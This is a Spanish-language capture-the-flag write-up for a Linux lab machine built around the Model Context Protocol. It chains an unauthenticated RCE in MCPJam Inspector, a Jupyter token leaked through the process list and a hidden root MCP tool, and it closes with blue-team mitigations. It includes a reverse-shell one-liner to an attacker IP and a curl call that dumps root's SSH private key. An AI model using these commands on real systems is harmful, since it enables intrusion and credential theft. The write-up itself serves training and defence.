DevHub es una máquina Linux de dificultad media temática alrededor del Model Context Protocol (MCP). La cadena arranca con un RCE no autenticado en MCPJam Inspector, pivota entre usuarios a través de un token de Jupyter filtrado por la lista de procesos, y termina en root abusando de una tool oculta en un servidor MCP interno que corre como root — un caso de libro de control de acceso por oscuridad.

01.#Reconocimiento

nmap · mapa de servicios desde la propia web

El escaneo revela tres puertos: 22 (SSH), 80 (nginx) y 6274, este último sin firma para nmap pero con un banner HTML que lo delata como MCPJam Inspector. El puerto 80 hace virtual hosting por nombre, así que se agrega devhub.htb al archivo de hosts.

nmap
nmap -p- --open -sC -sS -sV --min-rate 5000 -Pn -oN scan01.txt 10.129.111.202
22/tcp   open  ssh      OpenSSH 8.9p1 (Ubuntu)
80/tcp   open  http     nginx 1.18.0  → redirige a devhub.htb
6274/tcp open  http     MCPJam Inspector

La propia landing nos regala el mapa de la máquina: tres servicios, uno expuesto y dos internos. El patrón es claro — usar el servicio expuesto para ejecutar hacia adentro.

🧭 Idea clave

Un servicio expuesto (Inspector) + dos internos jugosos (Jupyter, Git) solo alcanzables desde el host. El Inspector es la puerta; los internos son el objetivo.

02.#Enumeración del MCPJam Inspector

versión · investigación de CVE

MCPJam Inspector es una herramienta de desarrollo/debug para servidores MCP: por diseño se conecta a «servidores» arbitrarios, ya sea por stdio (ejecutando un comando local) o por HTTP/SSE (una URL). Sin autenticación delante, eso huele a RCE o SSRF. La sección Settings revela la versión exacta.

🎯 CVE-2026-23744

RCE no autenticado en MCPJam Inspector v1.4.2: el endpoint POST /api/mcp/connect acepta un serverConfig con transporte stdio y un comando arbitrario, que el Inspector ejecuta sin pedir credenciales. PoC público: boroeurnprach/CVE-2026-23744-PoC.

ℹ Nota

Se confirma que el vector es RCE directo vía stdio, no SSRF hacia el Jupyter interno — el Inspector ejecuta el comando en el propio host.

03.#Foothold — RCE (CVE-2026-23744)

stdio arbitrario → reverse shell como mcp-dev

Con un listener a la escucha, el exploit dispara un serverConfig con transporte stdio cuyo «comando» es una reverse shell hacia la VPN. El read timeout del PoC es esperable: la shell interactiva bloquea la respuesta HTTP.

python exploit.py 10.129.111.202 'bash -c "sh -i >& /dev/tcp/10.10.15.240/4444 0>&1"'

Connection received

uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)

Tras estabilizar la TTY (script /dev/null -c bash, stty raw -echo; fg, export TERM=xterm), ya se tiene una shell cómoda como mcp-dev para enumerar desde adentro.

04.#Enumeración interna y token de Jupyter

ss -tulnp · ps aux · secretos en la línea de comandos

Desde dentro, ss -tulnp confirma dos servicios en loopback que no se veían desde fuera: 127.0.0.1:8888 (Jupyter, corre como analyst) y 127.0.0.1:5000 (OPSMCP, otro servidor MCP que corre como root y exige un header X-API-Key).

internal enum
ss -tulnp
tcp LISTEN 127.0.0.1:8888   # Jupyter (analyst)
tcp LISTEN 127.0.0.1:5000   # OPSMCP (root, pide X-API-Key)
ps aux | grep jupyter
analyst 1080 jupyter-lab --ip=127.0.0.1 --port=8888 \
  --ServerApp.token=token
🔑 Fuga de token

El token de Jupyter quedó como argumento de línea de comandos del proceso jupyter-lab, visible por cualquier usuario vía ps aux (/proc/<pid>/cmdline es legible por todos sin hidepid=2). Token: a7f3…f6a7 — el pasaporte para pivotar a analyst.

05.#Pivote a analyst y user.txt

port-forward SSH → JupyterLab → !comando → shell analyst

Con un port-forward SSH al 8888 (usando una clave propia dejada en authorized_keys de mcp-dev), se abre JupyterLab en el navegador local autenticado con el token robado. Dentro está el notebook «Q4 2025 Analytics Report».

La terminal integrada de JupyterLab no respondía, así que se usa el truco de ejecutar comandos con ! dentro de una celda (el kernel corre como analyst) para lanzar una segunda reverse shell.

06.#Post-explotación: OPSMCP como root

linpeas · permisos mal puestos · causa raíz

Un barrido con linpeas como analyst apunta directo al servicio de root: OPSMCP (127.0.0.1:5000). Dos hallazgos comparten la misma causa raíz — el directorio del servicio quedó con dueño analyst en vez de root.

linpeas → privesc
ls -la /home/analyst/.opsmcp_key
-rw------- analyst analyst  35   # API key de OPSMCP, legible por nosotros
ls -ld /opt/opsmcp /opt/opsmcp/server.py
drwxr-xr-x analyst analyst   # server.py de un servicio root, escribible
systemctl show opsmcp.service | grep -i user
User=root
🚫 Caminos descartados

Sin sudo (ni NOPASSWD ni token cacheado), sin SUID/capabilities raras, sin grupos peligrosos (docker/lxd). DirtyPipe (CVE-2022-0847) aparece por versión de kernel pero queda como último recurso — hay un camino userland «a medida». El segundo camino (server.py escribible + reload de Werkzeug) se descarta porque el servicio corre con debug=False: sin reloader, reescribir el archivo no reinicia el proceso root.

07.#Escalada a root — tool oculta

API key legible + control de acceso por oscuridad

Como analyst se leen los dos archivos: la API key de OPSMCP y el código de server.py. El código separa VISIBLE_TOOLS (lo que devuelve /tools/list) de HIDDEN_TOOLS — pero ambas están en ALL_TOOLS y siguen siendo invocables vía /tools/call: la validación solo comprueba que la tool exista, no si es «pública».

🐛 Causa raíz

Control de acceso por oscuridad. La tool oculta ops._admin_dump (con {target, confirm}) devuelve, según target, la clave privada de /root/.ssh/id_rsa, hashes de contraseñas o tokens internos. Ocultar un endpoint del listado no es protegerlo.

Aprovechando el port-forward al 5000, se invoca la tool oculta con target: "ssh_keys" y se obtiene la clave privada de root, que da login SSH directo.

root
curl -s -X POST http://localhost:5000/tools/call \
  -H "X-API-Key: opsmcp_…" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
{ "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY----- …" }
ssh -i id_root root@10.129.111.202
uid=0(root) gid=0(root) groups=0(root)

09.#Detección y mitigación (Blue Team)

cómo se rompe la cadena desde el otro lado

No exponer herramientas de desarrollo

Un Inspector MCP que ejecuta comandos stdio arbitrarios nunca debería ser alcanzable desde fuera. Parchear MCPJam y ponerlo detrás de autenticación/VPN, o no exponerlo en absoluto.

Secretos fuera de la línea de comandos

El token de Jupyter no debe ir como argumento (visible en ps//proc). Usar archivo de config o variable de entorno, y montar /proc con hidepid=2 para que un usuario no vea los procesos de otro.

Mínimo privilegio y propiedad correcta

La causa raíz fue /opt/opsmcp con dueño analyst y el servicio corriendo como root. Los binarios/scripts de un servicio root deben pertenecer a root, y el servicio correr con una cuenta sin privilegios.

Autorización real, no «oscuridad»

Ocultar una tool del listado no la protege: /tools/call debe aplicar control de acceso por tool (allowlist de tools públicas), no solo comprobar que exista. Detectar además reverse shells salientes y llamadas a tools administrativas.
